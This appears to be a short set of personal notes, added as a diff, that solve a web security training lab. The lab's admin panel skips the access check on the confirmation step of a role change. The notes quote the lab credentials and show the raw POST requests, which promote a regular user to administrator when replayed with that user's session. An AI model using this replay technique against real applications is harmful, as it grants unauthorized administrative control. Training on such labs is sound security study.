@@ -1,0 +1,31 @@
+Lab: Multi-step process with no access control on one step 
+
+ This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
+
+Lets see the admin panel
+
+lets upgrade carlos to see what happend
+
+https://0a7500fc03e361d58140161f006300c9.web-security-academy.net/admin
+
+POST /admin-roles HTTP/2
+
+username=carlos&action=upgrade
+
+then are u sure?
+
+POST /admin-roles HTTP/2
+action=upgrade&confirmed=true&username=carlos
+
+lets see with wiener
+
+/admin doesnt work Admin 
+
+interface only available if logged in as an administrator
+
+admin-roles "Unauthorized"
+
+lets try using our session in burp suit
+just changing the session and the username it works
